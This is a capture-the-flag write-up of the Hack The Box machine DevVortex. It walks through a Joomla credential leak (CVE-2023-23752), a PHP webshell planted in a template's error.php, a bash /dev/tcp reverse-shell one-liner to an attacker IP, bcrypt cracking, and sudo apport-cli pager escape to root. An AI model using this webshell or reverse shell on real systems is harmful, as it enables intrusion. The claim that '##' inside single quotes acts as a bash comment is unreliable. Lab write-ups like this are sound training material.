---
title: "DevVortex - Writeup"
linkTitle: "DevVortex"
weight: 14
featured: true
platform: "HTB"
name: "DevVortex"
os: "Linux"
difficulty: "Easy"
release: "25 Nov 2023"
ip: "10.129.229.146"
# Drop a real avatar at static/img/htb/devvortex.png and uncomment:
# avatar: "/img/htb/devvortex.png"
tags: ["linux", "joomla", "cve-2023-23752", "information-disclosure", "credential-reuse", "hashcat", "cve-2023-1326", "sudo-abuse"]
description: "Easy Linux box. An unauthenticated info-disclosure bug in Joomla leaks database creds that double as CMS admin creds, and a sudo-abuse CVE in apport-cli closes the gap to root."
---
{{< htb name="DevVortex" os="Linux" difficulty="Easy" release="25 Nov 2023" ip="10.129.229.146" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.229.146
```
```
Open 10.129.229.146:22
Open 10.129.229.146:80
```

Only SSH and a single web server are exposed, so port 80 is the only real avenue in.

![Default DevVortex landing page served on the base hostname](/img/htb/devvortex/01-devvortex-landing-page.png)

The default site is just a generic web design agency template — nothing exploitable on its own.

## Enumeration

Fuzzing the Host header turns up a hidden virtual host:

```
(root㉿kali)# ffuf -u http://10.129.229.146 -H 'Host: FUZZ.devvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```
```
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 237ms]
```

After adding `dev.devvortex.htb` to `/etc/hosts`, a completely different site loads:

![dev.devvortex.htb virtual host homepage](/img/htb/devvortex/02-dev-vhost-homepage.png)

Content discovery against the new vhost reveals a Joomla-shaped directory structure:

```
(root㉿kali)# ffuf -u http://dev.devvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -c -e .php
```
```
administrator           [Status: 301]
api                     [Status: 301]
components              [Status: 301]
configuration.php       [Status: 200]
libraries               [Status: 301]
templates               [Status: 301]
```

`/administrator` confirms it — a Joomla login panel for a site named "Development".

![Joomla Administrator login panel at /administrator](/img/htb/devvortex/03-joomla-admin-panel.png)

Joomla's update manifest leaks the exact version pre-authentication:

```
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

![joomla.xml manifest disclosing the installed Joomla version](/img/htb/devvortex/04-joomla-version-disclosure.png)

**Version confirmed: Joomla 4.2.6** — vulnerable to [CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752), an unauthenticated API information disclosure affecting Joomla 4.0.0 through 4.2.7.

## Initial Foothold

```
(root㉿kali)# ruby exploit.rb http://dev.devvortex.htb
```
```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Database info
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
```

The exploit pulls the database connection block straight out of `configuration.php` through a protected API route it shouldn't have access to. On CTF-style boxes, DB and CMS credentials are frequently the same account — worth testing directly on the admin login.

![Joomla admin login attempt with lewis and the leaked DB password](/img/htb/devvortex/05-joomla-admin-login-failed.png)

The first attempt returned "Username and password do not match" — with a password containing `##`, a careful retry of the exact same credentials succeeded, landing full Super User access to the Joomla back end.

From **System → Site Templates → Cassiopeia Details and Files**, `error.php` is writable. Dropping a one-line backdoor into it turns Joomla's own custom error page into a command execution primitive:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
    die();
}
?>
```

```
http://dev.devvortex.htb/NothingAtAll?cmd=ls
```

![Joomla custom error page executing ls via the planted error.php backdoor](/img/htb/devvortex/06-webshell-rce-confirmed.png)

Turning that into a shell just means passing a reverse shell one-liner through the same `cmd` parameter — spaces converted to `+`, then the whole thing URL-encoded:

```
bash -c 'bash -i >& /dev/tcp/10.10.15.249/4422 0>&1'
→ bash+-c+'bash+-i+>%26+%2Fdev%2Ftcp%2F10.10.15.249%2F4422+0>%261'
```

```
(root㉿kali)# nc -lnvp 4422
```
```
listening on [any] 4422 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.229.146] 37248
www-data@devvortex:~/dev.devvortex.htb$
```

![Browser triggering the URL-encoded reverse shell while netcat catches the connection as www-data](/img/htb/devvortex/07-reverse-shell-caught.png)

## Privilege Escalation

`configuration.php` on disk confirms the same DB credentials leaked earlier:

```
$ cat configuration.php
```
```
public $user = 'lewis';
public $password = 'P4ntherg0t1n5r3c0n##';
public $db = 'joomla';
```

The `##` breaks inline `-p'...'` password parsing in bash (it's read as a comment), so the interactive prompt is needed instead:

```
$ mysql -u lewis -p
```
```
Enter password: P4ntherg0t1n5r3c0n##
```

```
mysql> select * from sd4fg_users;
```
```
| id  | username | password
| 649 | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
| 650 | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

Logan's hash is bcrypt, confirmed with `hashid`, and cracks quickly against rockyou since it's a real dictionary word rather than a random string:

```
(root㉿kali)# hashcat -m 3200 hash_logan /usr/share/wordlists/rockyou.txt
```
```
$2y$10$IT4k5kmSGvHSO9d6M...tkIj12:tequieromucho
Status...........: Cracked
```

```
$ su logan
```
```
Password: tequieromucho
```
```
$ cat /home/logan/user.txt
```
```
713efad1e726af54df689692e03cad29
```

`sudo -l` shows a single, oddly specific allowance:

```
$ sudo -l
```
```
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

`apport-cli` is vulnerable to [CVE-2023-1326](https://github.com/cve-2024/CVE-2023-1326-PoC) — its "View report" option opens the crash report in a pager, and pagers can be escaped straight to a shell that inherits the sudo elevation.

```
$ sudo /usr/bin/apport-cli /bin/bash
```
```
Please choose (S/V/K/I/C): V
```

Escaping the pager with `!/bin/bash` spawns a root shell:

```
root@devvortex:/tmp# cat /root/root.txt
```
```
1bd54296907a23ce2cf63c40d2647e39
```

## Lessons learned

- A leaked DB password is always worth trying as the application's own admin password before looking for anything more exotic — credential reuse between the two is extremely common.
- A single failed login attempt doesn't rule out valid credentials. Passwords with special characters like `##` are easy to mistype or mis-paste; retry carefully before moving on.
- Any admin panel that lets you edit "theme" or "template" files is a code-execution primitive in disguise — a writable `error.php`, `functions.php`, or similar is all it takes to get a webshell.
- The same `##`-in-password issue that broke the first login attempt also broke inline shell password parsing later (`mysql -u lewis -p'...'`). Recognize when a password needs to go through an interactive prompt instead of a command-line argument.
- Not every sudo rule needs a fancy binary to be dangerous — `apport-cli` looks harmless until you remember GTFOBins-style pager escapes apply to almost anything that shells out to `less`/`more`.
